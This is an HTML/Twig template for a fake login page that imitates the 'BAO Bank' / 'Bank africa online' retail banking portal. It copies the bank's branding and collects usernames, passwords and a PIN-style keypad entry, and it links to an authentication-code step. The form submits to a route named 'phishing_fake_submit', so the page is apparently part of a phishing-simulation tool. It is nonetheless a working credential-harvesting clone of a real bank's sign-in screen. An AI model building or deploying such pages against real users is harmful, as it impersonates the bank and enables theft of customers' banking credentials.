<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>BAO Bank - Secure Portal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        :root {
            --bg-black: #050505;
            --form-bg: #0d0e12;
            --input-dark: #1a1c24;
            --brand-green: #008a3c;
            --brand-red: #c4000d;
            --text-gray: #a0a0a0;
        }
        body {
            margin: 0;
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: var(--bg-black);
            color: white;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        .top-nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 50px;
        }
        .logo-area {
            display: flex;
            align-items: center;
            gap: 12px;
            font-weight: bold;
            font-size: 1.1rem;
            letter-spacing: 1px;
        }
        .logo-symbol {
            color: var(--brand-green);
            font-size: 1.5rem;
        }
        .nav-links {
            display: flex;
            gap: 25px;
            align-items: center;
            font-size: 0.85rem;
        }
        .nav-links a { color: white; text-decoration: none; opacity: 0.8; }
        .lang-switch { display: flex; gap: 2px; }
        .lang-switch span {
            padding: 2px 8px;
            border: 1px solid #444;
            font-size: 0.75rem;
        }
        .lang-switch .active { background-color: white; color: black; }
        .main-wrapper {
            display: flex;
            flex: 1;
            padding: 0 50px 50px 50px;
            max-width: 1300px;
            margin: 0 auto;
            width: 100%;
            box-sizing: border-box;
        }
        .promo-side { flex: 1.2; padding-top: 20px; }
        .promo-side h1 { font-size: 2.8rem; margin: 0; }
        .promo-side h2 { font-size: 1.4rem; font-weight: normal; margin-bottom: 30px; }
        
        /* --- SECTION MISE À JOUR POUR L'IMAGE --- */
        .image-banner {
            position: relative;
            /* Superposition : Dégradé noir à gauche vers transparent à droite, puis l'image Twig */
            background-image: linear-gradient(to right, rgba(0,0,0,0.9) 0%, rgba(0,0,0,0.4) 50%, transparent 100%), url("{{ asset('images/bao.jpg') }}");
            background-size: cover;
            background-position: center;
            height: 450px;
            border-radius: 8px;
            display: flex;
            align-items: center;      /* Centre le contenu verticalement */
            justify-content: flex-start; /* Aligne le contenu strictement à gauche */
            padding-left: 40px;       /* Maintient l'espace à gauche */
            overflow: hidden;
            border: 1px solid #333;
        }

        .features {
            z-index: 2;
            max-width: 380px; /* Limite la largeur pour que le texte ne prenne que la partie gauche */
        }

        .feature-item {
        
            /* Assombrit légèrement juste derrière le texte */
            padding: 15px 20px;
            margin-bottom: 15px;
            backdrop-filter: blur(4px); /* Petit effet de flou élégant */
            
        }
        .feature-item h3 { margin: 0; font-size: 1.1rem; color: white; }
        .feature-item p { margin: 5px 0 0; font-size: 0.9rem; color: #ccc; }
        /* -------------------------------------- */

        .form-side { flex: 0.8; padding-top: 20px; padding-left: 60px; }
        .login-box { background-color: var(--form-bg); padding: 40px; border-radius: 4px; }
        .login-title {
            font-size: 1.4rem;
            text-align: ;
            border-bottom: 2px solid white;
            width: fit-content;
            margin: 0 0 40px auto;
            padding-bottom: 4px;
        }
        .input-group { margin-bottom: 20px; }
        .input-group label { font-size: 0.85rem; margin-bottom: 8px; display: block; color: var(--text-gray); }
        .field {
            display: flex;
            background-color: var(--input-dark);
            border-radius: 4px;
            overflow: hidden;
            border: 1px solid #333;
        }
        .icon-box {
            background-color: var(--brand-green);
            width: 45px;
            height: 45px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 1.1rem;
        }
        input {
            background: transparent;
            border: none;
            color: white;
            padding: 12px;
            width: 100%;
            outline: none;
        }
        .keypad {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 8px;
            margin: 20px 0;
        }
        .key {
            background-color: #1e212b;
            border: none;
            color: white;
            padding: 15px;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .key:hover { background-color: #2a2e3d; }
        .btn-clear {
            background-color: var(--brand-red);
            color: white;
            border: none;
            padding: 10px 25px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.9rem;
        }
        .btn-submit {
            background-color: var(--brand-green);
            color: white;
            border: none;
            padding: 10px 25px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.9rem;
            font-weight: bold;
        }
        .action-buttons {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 20px 0;
        }
        .mfa-link {
            background-color: #1a1c24;
            padding: 15px;
            font-size: 0.8rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            text-decoration: none;
            color: white;
            border-radius: 4px;
            margin-top: 20px;
        }
        /* Responsive */
        @media (max-width: 1024px) {
            .main-wrapper {
                flex-direction: column;
                padding: 0 20px 30px;
            }
            .form-side {
                padding-left: 0;
                padding-top: 40px;
            }
            .image-banner { padding-left: 20px; }
        }
        @media (max-width: 600px) {
            .top-nav {
                flex-direction: column;
                gap: 10px;
                padding: 15px 20px;
            }
            .nav-links {
                gap: 15px;
                flex-wrap: wrap;
                justify-content: center;
            }
            .promo-side h1 { font-size: 1.8rem; }
            .promo-side h2 { font-size: 1rem; }
            .image-banner { height: auto; padding: 20px; justify-content: center; }
            .features { max-width: 100%; }
            .feature-item { border-radius: 4px; border-left: none; border-top: 4px solid var(--brand-green); }
            .login-box { padding: 25px; }
            .keypad { gap: 5px; }
            .key { padding: 10px; font-size: 1rem; }
        }
    </style>
</head>
<body>
    <nav class="top-nav">
        <div class="logo-area">
            <i class="fa-solid fa-shield-halved logo-symbol"></i>
         Bank africa online
        </div>
        <div class="nav-links">
            <a href="#">Claims</a>
            <a href="#">Contact us</a>
            <a href="#">User guide</a>
            <div class="lang-switch">
                <span class="active">EN</span>
                <span>FR</span>
            </div>
        </div>
    </nav>

    <main class="main-wrapper">
        <section class="promo-side">
            <h1>Bienvenue sur Baoweb </h1>
            <h2>Nouvelle interface pour les clients détaillants</h2>
            <div class="image-banner">
                <div class="features">
                    <div class="feature-item">
                        <h3>Improved design</h3>
                        <p>Easier and intuitive navigation</p>
                    </div>
                    <div class="feature-item">
                        <h3>More features</h3>
                        <p>Manage your accounts and cards seamlessly</p>
                    </div>
                    <div class="feature-item">
                        <h3>Enhanced security</h3>
                        <p>Multi-factor authentication enabled</p>
                    </div>
                </div>
            </div>
        </section>

        <section class="form-side">
            <div class="login-box">
                <div class="login-title">LOG IN</div>
                <form method="post" action="{{ path('phishing_fake_submit') }}">
                    <input type="hidden" name="token" value="{{ token }}">
                    <div class="input-group">
                        <label>Entrer votre nom d'utilisateur:</label>
                        <div class="field">
                            <div class="icon-box"><i class="fa-solid fa-user"></i></div>
                            <input type="text" name="username" placeholder="USERNAME" required>
                        </div>
                    </div>
                    <div class="input-group">
                        <label>Entrer votre mot de passe:</label>
                        <div class="field">
                            <div class="icon-box"><i class="fa-solid fa-lock"></i></div>
                            <input type="password" name="password" required>
                        </div>
                    </div>
                    <div class="keypad">
                        <button type="button" class="key">8</button><button type="button" class="key">9</button>
                        <button type="button" class="key">5</button><button type="button" class="key">0</button>
                        <button type="button" class="key">1</button><button type="button" class="key">7</button>
                        <button type="button" class="key">6</button><button type="button" class="key">2</button>
                        <button type="button" class="key">4</button><button type="button" class="key">3</button>
                    </div>
                    <div class="action-buttons">
                        <button type="button" class="btn-clear">CLEAR</button>
                        <button type="submit" class="btn-submit">VALIDATE</button>
                    </div>
                </form>
                <a href="#" class="mfa-link">
                    <span>Entrer le code d'authentification (Google/Microsoft)</span>
                    <i class="fa-solid fa-chevron-right"></i>
                </a>
            </div>
        </section>
    </main>
</body>
</html>